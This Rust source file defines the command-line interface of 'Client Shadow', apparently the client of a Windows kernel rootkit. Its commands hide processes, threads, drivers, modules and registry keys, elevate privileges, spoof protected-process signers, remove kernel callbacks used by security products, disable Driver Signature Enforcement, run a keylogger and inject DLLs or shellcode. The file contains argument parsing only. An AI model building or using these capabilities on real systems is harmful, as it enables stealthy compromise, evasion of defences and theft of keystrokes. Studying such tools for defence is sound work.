#![allow(non_camel_case_types)]

use clap::{arg, Parser, Subcommand, ValueHint, ArgAction};

/// The main command-line interface struct.
#[derive(Parser)]
#[clap(author="joaoviictorti", about="Client Shadow", long_about = None)]
pub struct Cli {
    /// The command to be executed.
    #[command(subcommand)]
    pub command: Commands,

    /// Activate verbose mode (-v, -vv for additional levels)
    #[arg(short, long, action = ArgAction::Count)]
    pub verbose: u8,
}

/// Enum representing the available top-level commands.
#[derive(Subcommand)]
pub enum Commands {
    /// Operations related to processes.
    Process {
        /// Subcommands for process operations.
        #[command(subcommand)]
        sub_command: ProcessCommands,
    },
    /// Operations related to threads.
    Thread {
        /// Subcommands for thread operations.
        #[command(subcommand)]
        sub_command: ThreadCommands,
    },
    /// Operations related to drivers.
    Driver {
        /// Hide the driver.
        #[arg(long)]
        hide: bool,
        
        /// Unhide the driver
        #[arg(long)]
        unhide: bool,
        
        /// Enumerate the drivers.
        #[arg(long, short)]
        list: bool,

        /// Name Driver
        #[arg(long, value_hint = ValueHint::FilePath, value_parser = validate_sys_extension)]
        name: Option<String>,
    },

    /// Operations related to Misc.
    Misc {
        /// Subcommands for Misc operations.
        #[command(subcommand)]
        sub_command: MisCommands,
    },

    /// Operations related to Registry.
    #[cfg(not(feature = "mapper"))]
    Registry {
        #[command(subcommand)]
        sub_command: RegistryCommands
    },

    /// Operations related to Module.
    Module {
        #[command(subcommand)]
        sub_command: ModuleCommands
    },

    /// Operations related to Callback.
    Callback {
        /// Enumerate callback.
        #[arg(long, short)]
        list: bool,
        
        /// Enumerate Removed callback.
        #[arg(long, short)]
        enumerate: bool,

        /// Remove callback.
        #[arg(long)]
        remove: Option<usize>,
        
        /// Select callback.
        #[arg(long, short, required = true)]
        callback: Callbacks,

        /// Restore callback.
        #[arg(long)]
        restore: Option<usize>,
    },
    /// Operations related to Injection
    Injection {
        /// Subcommands for thread operations.
        #[command(subcommand)]
        sub_command: InjectionCommands,
    },
}

#[derive(Subcommand)]
pub enum RegistryCommands {
    /// Enable protection for the registry
    Protect {
        /// name of the key to be protected
        #[arg(short, long, required = true)]
        key: String,
        
        /// name of the value key to be protected
        #[arg(short, long)]
        name: Option<String>,
        
        /// Add protection.
        #[arg(short, long)]
        add: bool,
        
        /// Remove protection.
        #[arg(short, long)]
        remove: bool,
    },
    /// Hide the registry
    Hide {
        /// name of the key to be hide
        #[arg(short, long, required = true)]
        key: String,

        /// name of the value to be hide
        #[arg(short, long)]
        value: Option<String>,
    },

    /// Unhide the registry
    Unhide {
        /// name of the key to be unhide
        #[arg(short, long, required = true)]
        key: String,

        /// name of the value to be unhide
        #[arg(short, long)]
        value: Option<String>,
    },
}

#[derive(Subcommand)]
pub enum InjectionCommands {

    /// DLL Injection
    DLL {
        /// The process ID to injection.
        #[arg(long, short, required = true)]
        pid: u32,

        /// Path containing the shellcode
        #[arg(long, required = true)]
        path: String,

        /// Type shellcode
        #[arg(long, short, required = true)]
        type_: Injection
    },

    /// Shellcode Injection
    Shellcode {
        /// The process ID to injection.
        #[arg(long, short, required = true)]
        pid: u32,

        /// Path containing the dll
        #[arg(long, required = true)]
        path: String,

        /// Type shellcode
        #[arg(long, short, required = true)]
        type_: Injection
    },
}

/// Enum representing the subcommands for process operations.
#[derive(Subcommand)]
pub enum ProcessCommands {
    /// Elevate the process.
    Elevate {
        /// The process ID to elevate.
        #[arg(short, long, required = true)]
        pid: u32,
    },
    /// Hide the process.
    Hide {
        /// The process ID to hide.
        #[arg(short, long, required = true)]
        pid: u32,
    },
    /// Unhide the process.
    Unhide {
        /// The process ID to unhide.
        #[arg(short, long, required = true)]
        pid: u32,
    },
    /// Terminate the process.
    Terminate {
        /// The process ID to terminate.
        #[arg(short, long, required = true)]
        pid: u32,
    },
    /// Signature the process.
    Signature {
        /// The process ID to protect.
        #[arg(short, long, required = true)]
        pid: u32,
        
        /// The protection type.
        #[arg(long, required = true)]
        pt: PS_PROTECTED_TYPE,

        /// The protection signer.
        #[arg(long, required = true)]
        sg: PS_PROTECTED_SIGNER,
    },
    /// Enable protection for the process.
    #[cfg(not(feature = "mapper"))]
    Protection {
        /// The process ID for protection.
        #[arg(short, long, required = true)]
        pid: u32,

        /// Add protection.
        #[arg(short, long)]
        add: bool,
        
        /// Remove protection.
        #[arg(short, long)]
        remove: bool,
    },
    /// Lists protected or hidden processes
    Enumerate {
        /// Enumerate Processes.
        #[arg(long, short, required = true)]
        list: bool,
        // Types Enumerate
        #[arg(long, short, required = true)]
        type_: Options,
    }
}

#[derive(Subcommand)]
pub enum MisCommands {
    /// Operations related to DSE (Driver Signature Enforcement).
    DSE {
        /// Disable DSE.
        #[arg(long)]
        disable: bool,
        
        /// Enable DSE.
        #[arg(long)]
        enable: bool,
    },

    /// Operations related to Keylogger.
    Keylogger {
        /// Stop the keylogger.
        #[arg(long)]
        stop: bool,
        
        /// Start the keylogger.
        #[arg(long)]
        start: bool,
    },
}

/// Enum representing the subcommands for module operations.
#[derive(Subcommand)]
pub enum ModuleCommands {
    /// Hide the module.
    Hide {
        /// The module to hide.
        #[arg(short, long, required = true)]
        module: String,

        /// The pid to module.
        #[arg(short, long, required = true)]
        pid: u32,
    },
    
    /// Enumerate modules.
    Enumerate {
        /// The process ID for enumerate modules.
        #[arg(short, long, required = true)]
        pid: u32,
    }
}

/// Enum representing the subcommands for thread operations.
#[derive(Subcommand)]
pub enum ThreadCommands {
    /// Hide the thread.
    Hide {
        /// The thread ID to hide.
        #[arg(short, long, required = true)]
        tid: u32,
    },
    /// Unhide the thread.
    Unhide {
        /// The thread ID to unhide.
        #[arg(short, long, required = true)]
        tid: u32,
    },
    /// Enable protection for the thread.
    #[cfg(not(feature = "mapper"))]
    Protection {
        /// The thread ID for protection.
        #[arg(short, long, required = true)]
        tid: u32,
        /// Add protection.
        #[arg(short, long)]
        add: bool,
        /// Remove protection.
        #[arg(short, long)]
        remove: bool,
    },
    /// Lists protected or hidden processes
    Enumerate {
        /// Enumerate Processes.
        #[arg(long, required = true)]
        list: bool,
        // Types Enumerate
        #[arg(long, short, required = true)]
        type_: Options,
    }
}

/// Enum representing the types of process protection.
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum PS_PROTECTED_TYPE {
    /// No protection.
    None = 0,
    /// Light protection.
    ProtectedLight = 1,
    /// Full protection.
    Protected = 2,
}

#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum Injection {
    /// Injection using Thread
    Thread = 0,
    /// Injection using APC
    APC = 1,
}

/// Enum representing the signers for process protection.
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum PS_PROTECTED_SIGNER {
    /// No signer.
    None = 0,
    /// Authenticode signer.
    Authenticode = 1,
    /// Code generation signer.
    CodeGen = 2,
    /// Antimalware signer.
    Antimalware = 3,
    /// LSA signer.
    Lsa = 4,
    /// Windows signer.
    Windows = 5,
    /// WinTcb signer.
    WinTcb = 6,
    /// WinSystem signer.
    WinSystem = 7,
    /// Application signer.
    App = 8,
    /// Maximum value for signers.
    Max = 9,
}

/// Enum representing callbacks
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum Callbacks {
    /// Callback for PsSetCreateProcessNotifyRoutine.
    Process,
    /// Callback for PsSetCreateThreadNotifyRoutine.
    Thread,
    /// Callback for PsSetLoadImageNotifyRoutine.
    LoadImage,
    /// Callback for CmRegisterCallbackEx
    Registry,
    /// Callback for ObProcess
    ObProcess,
    /// Callback for ObThread
    ObThread,
}

impl Callbacks {
    pub fn to_shared(self) -> shared::vars::Callbacks {
        match self {
            Callbacks::Process => shared::vars::Callbacks::PsSetCreateProcessNotifyRoutine,
            Callbacks::Thread => shared::vars::Callbacks::PsSetCreateThreadNotifyRoutine,
            Callbacks::LoadImage => shared::vars::Callbacks::PsSetLoadImageNotifyRoutine,
            Callbacks::Registry => shared::vars::Callbacks::CmRegisterCallbackEx,
            Callbacks::ObProcess => shared::vars::Callbacks::ObProcess,
            Callbacks::ObThread => shared::vars::Callbacks::ObThread,
        }
    }
}

/// Enum representing options enumeration
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum Options {
    /// List of hidden targets
    Hide,
    /// List of protected targets
    #[cfg(not(feature = "mapper"))]
    Protection
}

impl Options {
    pub fn to_shared(self) -> shared::vars::Options {
        match self {
            Options::Hide => shared::vars::Options::Hide,
            #[cfg(not(feature = "mapper"))]
            Options::Protection => shared::vars::Options::Protection,
        }
    }
}

fn validate_sys_extension(val: &str) -> Result<String, String> {
    if val.ends_with(".sys") {
        Ok(val.to_string())
    } else {
        Err(String::from("The driver file must have a .sys extension"))
    }
}
